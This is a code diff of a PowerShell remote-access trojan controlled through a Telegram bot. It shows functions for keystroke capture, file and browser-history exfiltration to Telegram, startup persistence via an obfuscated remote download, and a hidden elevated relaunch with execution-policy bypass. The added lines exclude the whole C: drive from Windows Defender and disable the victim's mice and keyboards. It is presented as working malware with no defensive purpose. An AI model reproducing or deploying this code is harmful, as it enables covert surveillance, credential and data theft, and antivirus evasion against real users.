@@ -63,29 +63,34 @@ $contents = "==============================================
 ==============================================
 
 Close   : Close this Session
-ExtraInfo    : Extra commands information
-PauseSession   : Kills this session and restarts
-ToggleErrors    : Toggle error messages to chat
-FolderTree    : Gets Dir tree and sends it zipped
+Extra-Info    : Extra commands information
+Pause-Session   : Kills this session and restarts
+Toggle-Errors    : Toggle error messages to chat
+Folder-Tree    : Gets Dir tree and sends it zipped
 Screenshot   : Sends a screenshot of the desktop
-Keycapture    : Capture Keystrokes and send
+Key-Capture    : Capture Keystrokes and send
 Exfiltrate   : Sends files (see below for info)
 Upload      : Uploads a specific file (use -path)
-Systeminfo   : Send System info as text file
-Softwareinfo   : Send Software info as text file
-Historyinfo   : Send History info as text file
-AddPersistance   : Add Telegram C2 to Startup
-RemovePersistance   : Remove Startup Persistance
-IsAdmin   : Checks if session has admin Privileges
-AttemptElevate  : Send user a prompt to gain Admin
+System-Info   : Send System info as text file
+Software-Info   : Send Software info as text file
+History-Info   : Send History info as text file
+Add-Persistance   : Add Telegram C2 to Startup
+Remove-Persistance   : Remove Startup Persistance
+Is-Admin   : Checks if session has admin Privileges
+Attempt-Elevate  : Send user a prompt to gain Admin
+Message   : Send a message to connected computer
 Kill    : Killswitch for 'KeyCapture' and 'Exfiltrate' 
+**ADMIN ONLY FUNCTIONS**
+Disable-AV   : Attempt to exclude C:/ from Defender
+Disable-HID   : Disable Mice and Keyboards
+Enable-HID    : Enable Mice and Keyboards
 
 =============================================="
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
 
-Function ExtraInfo{
+Function Extra-Info{
 $contents = "==============================================
 ============ $glass Examples and Info $glass ===========
 ==============================================
@@ -208,7 +213,7 @@ curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org
 Remove-Item -Path $filePath
 }
 
-Function KeyCapture {
+Function Key-Capture {
 $contents = "$env:COMPUTERNAME $tick KeyCapture Started.. (Stop with Killswitch)"
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
@@ -265,7 +270,7 @@ Start-Sleep -Milliseconds 10
 }
 }
 
-Function SystemInfo{
+Function System-Info{
 $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full")
 $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
 $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
@@ -329,7 +334,7 @@ Remove-Item -Path $FilePath -Force
 }
 
 
-Function SoftwareInfo{
+Function Software-Info{
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
 $service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
 $software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
@@ -350,7 +355,7 @@ Remove-Item -Path $FilePath -Force
 }
 
 
-Function HistoryInfo{
+Function History-Info{
 $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
 $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
 $Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
@@ -404,7 +409,7 @@ $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 }
 
-Function FolderTree{
+Function Folder-Tree{
 tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
 tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
 tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
@@ -418,13 +423,12 @@ rm -Path $zipFilePath -Force
 Write-Output "Done."
 }
 
-Function AddPersistance{
+Function Add-Persistance{
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
 sleep 1
 if ($newScriptPath.Length -lt 100){
     "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
     i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
     sleep 1
     Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
@@ -439,13 +443,13 @@ Write-Output "Persistance Added."
 rm -path "$env:TEMP\temp.ps1" -Force
 }
 
-Function RemovePersistance{
+Function Remove-Persistance{
 rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
 rm -Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
 Write-Output "Uninstalled."
 }
 
-Function PauseSession{
+Function Pause-Session{
 $contents = "$env:COMPUTERNAME $pause Pausing Session.."
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
@@ -453,8 +457,8 @@ $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
 if ($newScriptPath.Length -lt 100){
     "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
     i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
+    sleep 1
     Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
     }
 $tobat = @'
@@ -469,7 +473,7 @@ rm -path "$env:TEMP\temp.ps1" -Force
 exit
 }
 
-Function IsAdmin{
+Function Is-Admin{
 If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
     $contents = "$closed Current Session is NOT Admin $closed"
     $params = @{chat_id = $ChatID ;text = $contents}
@@ -482,15 +486,15 @@ If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     }
 }
 
-Function AttemptElevate{
+Function Attempt-Elevate{
 Write-Output "Prompt Sent to User.."
 if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
     $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
     $scriptContent | Out-File -FilePath $newScriptPath -force
     if ($newScriptPath.Length -lt 100){
         "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-        "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
         i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
+        sleep 1 
         Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
         }
     Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -File `"$env:APPDATA\Microsoft\Windows\temp.ps1`"") -Verb RunAs
@@ -498,7 +502,7 @@ if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::
     }
 }
 
-Function ToggleErrors{
+Function Toggle-Errors{
 If($global:errormsg -eq 0){
     $global:errormsg = 1
     $contents = "$tick Error Messaging ON $tick"
@@ -514,6 +518,40 @@ If($global:errormsg -eq 1){
     return
     }
 }
+
+Function Message([string]$Message){
+    msg.exe * $Message
+    Write-Output "Done."
+}
+
+# ---------------------------------------- ADMIN ONLY FUNCTIONS --------------------------------------------------
+
+Function Disable-AV{
+Add-MpPreference -ExclusionPath C:\
+Write-Output "Done."
+}
+
+Function Disable-HID{
+    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
+    $PNPMice.Disable()
+    $PNPMice.Delete()
+    $PNPMice = ''
+    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
+    $PNPKeyboard.Disable()
+    Write-Output "Done."
+}
+
+Function Enable-HID{
+    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
+    $PNPMice.Enable()
+    $PNPMice.Delete()
+    $PNPMice = ''
+    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
+    $PNPKeyboard.Enable()
+    Write-Output "Done."
+}
+
+
 
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
 
